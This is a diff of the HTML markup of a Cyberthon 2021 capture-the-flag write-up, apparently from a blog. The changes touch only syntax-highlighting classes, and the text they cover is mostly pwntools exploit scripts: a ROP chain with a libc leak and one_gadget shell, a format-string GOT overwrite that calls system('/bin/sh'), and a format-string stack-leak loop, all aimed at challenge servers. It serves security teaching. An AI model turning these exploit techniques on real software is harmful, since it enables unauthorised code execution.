-<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"MSG: </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">flag.txt.encrypted</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">flag</span><span class="o">=</span><span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+<span class="n">msg</span><span class="o">=</span><span class="nf">xor</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span><span class="n">key</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">MSG: </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 </code></pre></div></div>
 
 <h3 id="flag-1">Flag!</h3>
@@ -397,30 +397,30 @@ in so we can investigate further?
 <p>Instead of painstakingly explaining everything I will simply annotate my code:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg"</span><span class="p">,</span><span class="mi">30101</span><span class="p">)</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">r</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg</span><span class="sh">"</span><span class="p">,</span><span class="mi">30101</span><span class="p">)</span>
 <span class="c1"># r=process("./apcafe",env={"LD_PRELOAD" : "./libc6_2.31-0ubuntu9.2_amd64.so"}) 
 # The above is the correct LIBC version you should obtain from https://libc.blukat.me
-</span><span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./apcafe"</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"order?"</span><span class="p">)</span>
+</span><span class="n">binary</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./apcafe</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">order?</span><span class="sh">"</span><span class="p">)</span>
 <span class="c1"># scanf reads without restriction.
 # To circumvent the pesky check in serve_order() just send a null-byte after 10 characters.
 # This is probably a ropchain into shell since there is no win function
 # no syscall... means leak LIBC address from remote.
-</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4015a3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main"</span><span class="p">]))</span>
+</span><span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="se">\0</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x4015a3</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">"</span><span class="s">puts</span><span class="sh">"</span><span class="p">])</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">puts</span><span class="sh">"</span><span class="p">])</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">main</span><span class="sh">"</span><span class="p">]))</span>
 <span class="c1"># The stack pointer is at offset 18. Verify it yourself on GDB!
-</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"..."</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">puts_libc</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="o">-</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> 
+</span><span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">...</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+<span class="n">puts_libc</span><span class="o">=</span><span class="nf">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()[</span><span class="o">-</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span> 
 <span class="c1"># Leak the address of the puts() function in the GOT table.
 # The GOT table address is used since it is a link to the LIBC address.
-</span><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"PUTS: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_libc</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"order?"</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4015a3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"exit"</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main"</span><span class="p">]))</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"..."</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">exit_libc</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="o">-</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"EXIT: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">exit_libc</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</span><span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">PUTS: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">puts_libc</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">order?</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="se">\0</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x4015a3</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">"</span><span class="s">exit</span><span class="sh">"</span><span class="p">])</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">puts</span><span class="sh">"</span><span class="p">])</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">main</span><span class="sh">"</span><span class="p">]))</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">...</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+<span class="n">exit_libc</span><span class="o">=</span><span class="nf">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()[</span><span class="o">-</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">EXIT: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">exit_libc</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 <span class="c1"># Same thing as above.
 </span>
 <span class="c1"># It turns out there are 3 possible libc versions...
@@ -432,8 +432,8 @@ in so we can investigate further?
 # Obtained from libc-database, you should check it out.
 </span><span class="n">one_gadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0xe6c84</span>
 <span class="c1"># Obtained from one-gadget. Check that out too.
-</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4015a1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
-<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</span><span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="se">\0</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x4015a1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>After getting <strong>shell</strong> we thus obtain:</p>
@@ -498,38 +498,38 @@ Could u try to break in anyway? Who knows, access to this server might come in u
 <p>(Sidenote: I tried using <code class="language-plaintext highlighter-rouge">str_bin_sh</code>, but I got an absolutely dysfunctional shell which I spent debugging until the scoreboard was frozen :PPP)</p>
 
 <p>Here’s the code used to carry out the exploit:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg"</span><span class="p">,</span><span class="mi">30201</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">r</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg</span><span class="sh">"</span><span class="p">,</span><span class="mi">30201</span><span class="p">)</span>
 <span class="c1"># We leak the LIBC addresses as described here:
 # https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/pwn2.md
-</span><span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./apcdb"</span><span class="p">)</span>
-<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span>
+</span><span class="n">binary</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./apcdb</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span>
 <span class="n">inp_offset</span><span class="o">=</span><span class="mi">6</span>
-<span class="n">payload</span><span class="o">=</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">inp_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"exit"</span><span class="p">]:</span><span class="mh">0x40083f</span><span class="p">})</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Lookup: "</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Lookup: "</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"%7$s"</span><span class="o">+</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"printf"</span><span class="p">]))</span> 
+<span class="n">payload</span><span class="o">=</span><span class="nf">fmtstr_payload</span><span class="p">(</span><span class="n">inp_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">"</span><span class="s">exit</span><span class="sh">"</span><span class="p">]:</span><span class="mh">0x40083f</span><span class="p">})</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Lookup: </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Lookup: </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">%7$s</span><span class="sh">"</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">"</span><span class="s">printf</span><span class="sh">"</span><span class="p">]))</span> 
 <span class="c1"># Align it properly or you die!
 # Don't be like me in stacktheflags!
-</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"for "</span><span class="p">)</span>
+</span><span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">for </span><span class="sh">"</span><span class="p">)</span>
 <span class="c1"># print(r.recvuntil("...")[:-10].ljust(8,b'\x00'))
-</span><span class="n">printf</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">10</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf</span><span class="p">))</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Lookup: "</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"%7$s"</span><span class="o">+</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]))</span>
+</span><span class="n">printf</span><span class="o">=</span><span class="nf">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">...</span><span class="sh">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">10</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">printf</span><span class="p">))</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Lookup: </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">%7$s</span><span class="sh">"</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">"</span><span class="s">__libc_start_main</span><span class="sh">"</span><span class="p">]))</span>
 <span class="c1"># Align it properly or you die!
 # Don't be like me in stacktheflags!
-</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"for "</span><span class="p">)</span>
-<span class="n">libc_start</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">10</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_start</span><span class="p">))</span>
+</span><span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">for </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">libc_start</span><span class="o">=</span><span class="nf">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">...</span><span class="sh">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">10</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_start</span><span class="p">))</span>
 <span class="n">libc_base</span><span class="o">=</span><span class="n">libc_start</span><span class="o">-</span><span class="mh">0x21b10</span>
 <span class="n">system</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4f550</span>
 <span class="n">str_bin_sh</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x1b3e1a</span> <span class="c1"># Bad shell. BAD SHELL &gt;:(
-</span><span class="n">payload</span><span class="o">=</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">inp_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"printf"</span><span class="p">]:</span><span class="n">system</span><span class="p">})</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</span><span class="n">payload</span><span class="o">=</span><span class="nf">fmtstr_payload</span><span class="p">(</span><span class="n">inp_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">"</span><span class="s">printf</span><span class="sh">"</span><span class="p">]:</span><span class="n">system</span><span class="p">})</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p><img src="/assets/Images/Cyberthon-2021/apcdb_flag.png" alt="" /></p>
@@ -580,28 +580,28 @@ Not even a GOT overwrite!
 
 <p>In order to preserve the sanity of my terminals I opted to save <code class="language-plaintext highlighter-rouge">stdout</code> into a file.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span><span class="p">,</span><span class="n">hexlify</span>
-<span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">import</span> <span class="nn">sys</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span><span class="p">,</span><span class="n">hexlify</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">sys</span>
 <span class="n">Smash</span> <span class="n">the</span> <span class="n">stack</span> <span class="n">very</span> <span class="n">hard</span> <span class="n">using</span> <span class="n">this</span><span class="p">.</span> <span class="n">Sorry</span> <span class="n">niktay</span><span class="p">.</span>
-<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"log.txt"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span>
-<span class="n">r</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"./placeholder"</span><span class="p">)</span>
-<span class="n">streeng</span><span class="o">=</span><span class="s">""</span>
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">log.txt</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="o">=</span><span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./placeholder</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">streeng</span><span class="o">=</span><span class="sh">""</span>
 <span class="n">i</span><span class="o">=</span><span class="mi">100</span>
-<span class="k">while</span> <span class="n">hexlify</span><span class="p">(</span><span class="sa">b</span><span class="s">'Cybe'</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]).</span><span class="n">decode</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">streeng</span><span class="p">:</span>
-    <span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg"</span><span class="p">,</span><span class="mi">30501</span><span class="p">)</span>
-    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%llx"</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
-    <span class="n">streeng</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
-    <span class="n">streeng</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s">'(0x)|\(nil\)'</span><span class="p">,</span><span class="s">' '</span><span class="p">,</span><span class="n">streeng</span><span class="p">)</span>
-    <span class="n">streeng</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">r</span><span class="s">'( )+'</span><span class="p">,</span><span class="n">streeng</span><span class="p">)</span>
-    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">streeng</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="k">while</span> <span class="nf">hexlify</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Cybe</span><span class="sh">'</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]).</span><span class="nf">decode</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">streeng</span><span class="p">:</span>
+    <span class="n">r</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg</span><span class="sh">"</span><span class="p">,</span><span class="mi">30501</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">%llx</span><span class="sh">"</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">streeng</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="nf">recvall</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span>
+    <span class="n">streeng</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">(0x)|\(nil\)</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="n">streeng</span><span class="p">)</span>
+    <span class="n">streeng</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">( )+</span><span class="sh">'</span><span class="p">,</span><span class="n">streeng</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">streeng</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
     
     <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
     <span class="k">if</span> <span class="n">i</span><span class="o">&gt;</span><span class="mi">500</span><span class="p">:</span>
